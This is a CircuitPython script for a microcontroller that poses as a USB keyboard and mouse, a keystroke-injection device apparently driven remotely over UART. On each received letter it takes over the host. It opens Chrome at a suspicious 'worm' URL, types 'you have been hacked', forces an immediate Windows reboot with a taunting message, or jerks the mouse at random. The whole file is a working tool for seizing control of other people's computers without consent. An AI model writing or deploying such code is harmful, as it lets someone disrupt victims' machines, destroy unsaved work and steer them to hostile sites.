import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.mouse import Mouse
import time
import board
import digitalio
import busio
from random import randint

mouse = Mouse(usb_hid.devices)
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

led = digitalio.DigitalInOut(board.GP25)
led.direction = digitalio.Direction.OUTPUT

uart = busio.UART(tx=board.GP0, rx=board.GP1)

while True:
    data = uart.read(1)
    print(data)

    if data is not None:
        led.value = True

        data_string = " ".join([chr(b) for b in data])
        print(data_string, end="")

        led.value = False

        if data_string == "A":
            keyboard.send(Keycode.GUI, Keycode.R)
            time.sleep(0.1)
            layout.write("chrome\n")
            time.sleep(0.5)
            layout.write("http://www.5z8.info/worm_dvim \n")
        elif data_string == "B":
            count = 100
            while count > 0:
                layout.write("you have been hacked")
                time.sleep(0.02)
                break
                count -= 1
        elif data_string == "C":
            keyboard.send(Keycode.GUI, Keycode.R)
            time.sleep(0.1)
            layout.write("cmd\n")
            time.sleep(0.5)
            layout.write("shutdown /r /t 0 /c \"Sorry, not sorry xD\" \n")
        elif data_string == "D":
            start = time.monotonic()
            while time.monotonic() - start < 20:
                mouse.move(x=randint(-20, 20), y=randint(-20, 20))
                mouse.move(x=randint(-20, 20), y=randint(-20, 20))
